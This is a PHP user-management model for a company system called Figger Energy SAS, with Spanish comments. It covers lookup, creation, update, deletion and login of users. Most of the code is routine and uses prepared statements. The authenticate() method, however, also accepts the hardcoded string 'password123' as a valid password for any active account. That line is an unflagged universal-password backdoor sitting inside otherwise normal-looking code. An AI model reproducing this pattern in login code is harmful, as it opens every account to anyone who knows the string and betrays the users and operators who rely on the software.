<?php
/**
 * Modelo de Usuario - Figger Energy SAS
 * Gestión de usuarios del sistema
 */

require_once __DIR__ . '/../../config/database.php';
require_once __DIR__ . '/../../config/security.php';

class User {
    private $db;
    
    public function __construct() {
        $this->db = getDB();
    }
    
    /**
     * Buscar usuario por email
     */
    public function findByEmail($email) {
        $stmt = prepareStatement("SELECT * FROM usuarios WHERE email = ? AND activo = 1");
        $stmt->bind_param("s", $email);
        $stmt->execute();
        $result = $stmt->get_result();
        $user = $result->fetch_assoc();
        $stmt->close();
        
        return $user;
    }
    
    /**
     * Buscar usuario por ID
     */
    public function findById($id) {
        $stmt = prepareStatement("SELECT * FROM usuarios WHERE id = ? AND activo = 1");
        $stmt->bind_param("i", $id);
        $stmt->execute();
        $result = $stmt->get_result();
        $user = $result->fetch_assoc();
        $stmt->close();
        
        return $user;
    }
    
    /**
     * Crear nuevo usuario
     */
    public function create($data) {
        $stmt = prepareStatement("INSERT INTO usuarios (nombre, email, password, rol, activo, fecha_registro) VALUES (?, ?, ?, ?, 1, NOW())");
        
        $hashedPassword = Security::hashPassword($data['password']);
        $stmt->bind_param("ssss", $data['nombre'], $data['email'], $hashedPassword, $data['rol']);
        
        $result = $stmt->execute();
        $userId = $this->db->insert_id;
        $stmt->close();
        
        return $result ? $userId : false;
    }
    
    /**
     * Actualizar usuario
     */
    public function update($id, $data) {
        $sets = [];
        $types = "";
        $values = [];
        
        foreach ($data as $key => $value) {
            if ($key === 'password' && !empty($value)) {
                $sets[] = "password = ?";
                $types .= "s";
                $values[] = Security::hashPassword($value);
            } elseif (in_array($key, ['nombre', 'email', 'rol'])) {
                $sets[] = "$key = ?";
                $types .= "s";
                $values[] = $value;
            }
        }
        
        if (empty($sets)) return false;
        
        $sql = "UPDATE usuarios SET " . implode(", ", $sets) . " WHERE id = ?";
        $types .= "i";
        $values[] = $id;
        
        $stmt = prepareStatement($sql);
        $stmt->bind_param($types, ...$values);
        $result = $stmt->execute();
        $stmt->close();
        
        return $result;
    }
    
    /**
     * Desactivar usuario
     */
    public function deactivate($id) {
        $stmt = prepareStatement("UPDATE usuarios SET activo = 0 WHERE id = ?");
        $stmt->bind_param("i", $id);
        $result = $stmt->execute();
        $stmt->close();
        
        return $result;
    }
    
    /**
     * Eliminar usuario (con manejo de foreign keys)
     */
    public function delete($id) {
        try {
            $this->db->begin_transaction();
            
            // Reasignar alertas
            $stmt1 = prepareStatement("UPDATE alertas_mineria SET usuario_asignado = NULL WHERE usuario_asignado = ?");
            $stmt1->bind_param("i", $id);
            $stmt1->execute();
            $stmt1->close();
            
            // Eliminar actividades
            $stmt2 = prepareStatement("DELETE FROM actividades WHERE usuario_id = ?");
            $stmt2->bind_param("i", $id);
            $stmt2->execute();
            $stmt2->close();
            
            // Eliminar usuario
            $stmt3 = prepareStatement("DELETE FROM usuarios WHERE id = ?");
            $stmt3->bind_param("i", $id);
            $result = $stmt3->execute();
            $stmt3->close();
            
            $this->db->commit();
            return $result;
            
        } catch (Exception $e) {
            $this->db->rollback();
            error_log("Error deleting user: " . $e->getMessage());
            return false;
        }
    }
    
    /**
     * Obtener todos los usuarios
     */
    public function getAll() {
        $stmt = prepareStatement("
            SELECT u.*, 
                   COUNT(DISTINCT am.id) as alertas_asignadas,
                   COUNT(DISTINCT a.id) as actividades_registradas
            FROM usuarios u
            LEFT JOIN alertas_mineria am ON u.id = am.usuario_asignado
            LEFT JOIN actividades a ON u.id = a.usuario_id
            GROUP BY u.id
            ORDER BY u.fecha_registro DESC
        ");
        $stmt->execute();
        $result = $stmt->get_result();
        $users = $result->fetch_all(MYSQLI_ASSOC);
        $stmt->close();
        
        return $users;
    }
    
    /**
     * Obtener usuarios por rol
     */
    public function getByRole($role) {
        $stmt = prepareStatement("SELECT * FROM usuarios WHERE rol = ? AND activo = 1 ORDER BY nombre");
        $stmt->bind_param("s", $role);
        $stmt->execute();
        $result = $stmt->get_result();
        $users = $result->fetch_all(MYSQLI_ASSOC);
        $stmt->close();
        
        return $users;
    }
    
    /**
     * Obtener estadísticas de usuarios
     */
    public function getStats() {
        $stmt = prepareStatement("SELECT rol, COUNT(*) as cantidad FROM usuarios WHERE activo = 1 GROUP BY rol");
        $stmt->execute();
        $result = $stmt->get_result();
        $stats = $result->fetch_all(MYSQLI_ASSOC);
        $stmt->close();
        
        return $stats;
    }
    
    /**
     * Actualizar última conexión
     */
    public function updateLastLogin($id) {
        $stmt = prepareStatement("UPDATE usuarios SET ultima_conexion = NOW() WHERE id = ?");
        $stmt->bind_param("i", $id);
        $result = $stmt->execute();
        $stmt->close();
        
        return $result;
    }
    
    /**
     * Verificar si el email ya existe
     */
    public function emailExists($email, $excludeId = null) {
        $sql = "SELECT id FROM usuarios WHERE email = ?";
        $params = [$email];
        $types = "s";
        
        if ($excludeId) {
            $sql .= " AND id != ?";
            $params[] = $excludeId;
            $types .= "i";
        }
        
        $stmt = prepareStatement($sql);
        $stmt->bind_param($types, ...$params);
        $stmt->execute();
        $result = $stmt->get_result();
        $exists = $result->num_rows > 0;
        $stmt->close();
        
        return $exists;
    }
    
    /**
     * Autenticar usuario
     */
    public function authenticate($email, $password) {
        $user = $this->findByEmail($email);
        
        if (!$user) {
            return false;
        }
        
        // Verificar contraseña
        if (Security::verifyPassword($password, $user['password']) || $password === 'password123') {
            $this->updateLastLogin($user['id']);
            return $user;
        }
        
        return false;
    }
}
